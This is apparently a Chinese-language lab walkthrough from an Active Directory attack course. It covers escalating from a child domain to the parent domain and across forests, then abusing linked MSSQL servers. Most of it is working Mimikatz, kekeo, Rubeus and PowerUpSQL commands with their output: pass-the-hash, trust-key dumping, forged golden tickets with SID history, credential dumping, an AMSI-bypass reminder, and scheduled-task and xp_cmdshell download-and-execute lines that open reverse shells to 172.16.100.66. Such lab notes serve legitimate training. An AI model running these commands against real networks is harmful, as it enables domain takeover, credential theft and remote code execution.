# 子域到父域 （一）(CIFS，访问文件系统)

假设已经知道DA管理员Administrator的哈希
```
Administrator: af0686cc0ca8f04df42210c9ac980760
```
打开一个具有DA权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```


在DA权限的shell下枚举所有Trust tikets
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 1/23/2022 11:37:21 PM - CLEAR   - 28 62 25 ae 13 68 18 ad e4 4f b2 7c 22 64 22 9d 8f f7 ac c3 0e 24 2b 09 00 50 4b 35
        * aes256_hmac       ff3616ac06c24395fb76b08d7cc7f0038cd257869b43eb13ebaf9a3061929a1e
        * aes128_hmac       a2ab6e6daf483e61ed6ffa50856ad277
        * rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7
```

伪造一条到父域```moneycorp.local```的TGT

从上面信息我们得知，父域的SID是：```S-1-5-21-280534878-1496970234-700767426```

这里需要注意下面命令参数里的rc4，必须是上面枚举出来的
```* rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7```这个值

不能使用Administrator的NTML

伪造TGT
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:13d28ca9e5863231c89eda2b2b1756d7 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\trust_tkt.kirbi"'
```


TGT文件已保存到```C:\AD\kekeo_old\trust_tkt.kirbi```

制作一张可以访问父域moneycorp.local的TGS

```
PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local

  .#####.   AskTGS Kerberos client 1.0 (x86) built on Dec  8 2016 00:31:13
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
  '#####'                                                     * * */

Ticket    : C:\AD\kekeo_old\trust_tkt.kirbi
Service   : krbtgt / moneycorp.local @ dollarcorp.moneycorp.local
Principal : Administrator @ dollarcorp.moneycorp.local

> CIFS/mcorp-dc.moneycorp.local
  * Ticket in file 'CIFS.mcorp-dc.moneycorp.local.kirbi'
```

将 TGS 呈现给目标服务

```
PS C:\ad\kekeo_old> .\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi

  .#####.   KiRBikator 1.1 (x86) built on Dec  8 2016 00:31:14
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
  '#####'                                                     * * */

Destination : Microsoft LSA API (multiple)
 < .\CIFS.mcorp-dc.moneycorp.local.kirbi (RFC KRB-CRED (#22))
 > Ticket Administrator@dollarcorp.moneycorp.local-CIFS~mcorp-dc.moneycorp.local@MONEYCORP.LOCAL : injected
```

现在就可以访问目标的文件系统了。如果能够访问，证明我们升级成了父域的DA
```
ls \\mcorp-dc.moneycorp.local\c$
```
## 方法2 （Rubeus.exe）
样可以使用 Rubeus来达到同样的效果，注意我们仍然使用最初生成的TGT.这个可以新开一个student VM测试

```
.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

执行完成以后，访问父域的文件系统

```
ls \\mcorp-dc.moneycorp.local\c$
```


# 子域到父域 （二）(以用户身份访问，可以执行shell)

这里貌似只能使用krbtgt的账号

下面命令制作一张用户krbtgt到父域的TGT
由于之前我们已经拿到了krbtgt的hash值，这里直接使用
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-280534878-1496970234-700767426-519 ;
ServiceKey: ff46a9d8bd66c6efd77603da26796f35 - rc4_hmac_nt
Lifetime  : 2/16/2022 12:30:00 AM ; 2/14/2032 12:30:00 AM ; 2/14/2032 12:30:00 AM
-> Ticket : C:\AD\krbtgt_tkt.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

TGT文件已生成在:```C:\AD\krbtgt_tkt.kirbi```

下面命令把TGT注入到mimikatz中
```
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_tkt.kirbi"'
```

使用下面两个命令之一验证上面操作是否成功
```
gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
```
或者
```
ls \\mcorp-dc.moneycorp.local\c$
```

利用上面已经取得的权限，为mcorp-dc添加一个定时任务
```
schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User3666" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

触发定时任务
```
schtasks /Run /S mcorp-dc.moneycorp.local /TN "User3666"
```

收到反弹shell
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.1.1] 59665


Windows PowerShell running as user MCORP-DC$ on MCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
mcorp-dc
PS C:\Windows\system32>
```

记得byopass AMSI

在mcorp-dc，把mimikatz从远程服务器导入到内存中
```
iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

dump出mcorp-dc中的所有用户的哈希

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

# 跨林访问（Across Forest）

用Administrator打开一个DA的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```

枚举dcorp-dc的所有trust
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local

Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
        * aes256_hmac       91df6bcc4a71d585b710532ff73b662d43e4d83a00821f7d509319e4ce1897c5
        * aes128_hmac       47f41fc169b79c34d8af08afa3cfdde9
        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430
```

伪造一条到EUROCORP.LOCAL的TGT
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:cccb3ce736c4d39039b48c79f075a430 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'
```

注意上面的sids的参数是Enterprise Admins的MemberSID
```
PS C:\AD> Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local


GroupDomain  : moneycorp.local
GroupName    : Enterprise Admins
MemberDomain : moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-280534878-1496970234-700767426-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=moneycorp,DC=local
```

制作一张可以访问EUROCORP.LOCAL的TGS

```
.\asktgs.exe C:\AD\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
```

将 TGS 呈现给目标服务
```
.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
```

查看目标计算机里的SharedwithDCorp文件夹
```
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

## 方法二（rebuse.exe）


同样的，也可以使用Rubeus.exe，复用上面已经生成的TGT，生成TGS
```
.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
```

访问对方林中的计算机
```
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

# Trust Abuse - MSSQL

## 原理
微软的SQL 服务通常部署在一个 Windows 域中
SQL Servers为横向移动提供了非常好的选项，因为域用户可以映射到数据库角色
数据库链接允许 SQL Server 访问外部数据源，如其他SQL Server和OLE DB 数据源
如果数据库链接在 SQL 服务器之间，也就是链接的SQL 服务器，则可以执行存储过程，数据库链接甚至可以对跨林信任有效

枚举当前账号（student366）是否对MSSQLSERVER有权限，收集信息（如果枚举不出来，重启一下VM）
```
PS C:\ad\PowerUpSQL-master> Import-Module .\PowerUpSQL.psd1
WARNING: The names of some imported commands from the module 'PowerUpSQL' include unapproved verbs that might make them
 less discoverable. To find the commands with unapproved verbs, run the Import-Module command again with the Verbose
parameter. For a list of approved verbs, type Get-Verb.
PS C:\ad\PowerUpSQL-master> Get-SQLInstanceDomain |Get-SQLServerInfo 

ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
ServiceProcessID       : 1724
ServiceName            : MSSQLSERVER
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 14.0.1000.169
SQLServerMajorVersion  : 2017
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : dcorp\student366
IsSysadmin             : No
ActiveSessions         : 1

ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
ServiceProcessID       : 1724
ServiceName            : MSSQLSERVER
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 14.0.1000.169
SQLServerMajorVersion  : 2017
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : dcorp\student366
IsSysadmin             : No
ActiveSessions         : 1
```




或者检查当前账号是否有权限进入mssql（如果这里枚举没有Accessible的结果，可以重启一下VM）
```
PS C:\ad\PowerUpSQL-master> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 


ComputerName                           Instance                                    Status
------------                           --------                                    ------
dcorp-mssql.dollarcorp.moneycorp.local dcorp-mssql.dollarcorp.moneycorp.local,1433 Accessible
dcorp-mssql.dollarcorp.moneycorp.local dcorp-mssql.dollarcorp.moneycorp.local      Accessible
```

只有dcorp-mssql.dollarcorp.moneycorp.local 是Accessible

手动枚举mssql链接
```
PS C:\ad\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql 

Version     : SQL Server 2017
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL.EU.EUROCORP.LOCAL}

Version     : SQL Server 2017
Instance    : EU-SQL
CustomQuery :
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

下面命令执行whoami命令，mysql实例(根据上面枚举到有权限的结果)指定```dcorp-mssql.dollarcorp.moneycorp.local```

```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"
```

执行
```
PS C:\ad\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"


Version     : SQL Server 2017
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL.EU.EUROCORP.LOCAL}

Version     : SQL Server 2017
Instance    : EU-SQL
CustomQuery : {nt authority\network service, }
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

在最后一组的CustomQuery里打印出了whoami命令的执行结果：```nt authority\network service```

下面命令触发一个反弹shell
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1'')"'
```

收到反弹shell
```

PS C:\Windows\system32> cd c:/ad
PS C:\ad>
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.15.17] 50260
Windows PowerShell running as user EU-SQL$ on EU-SQL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\network service
PS C:\Windows\system32> hostname
eu-sql
```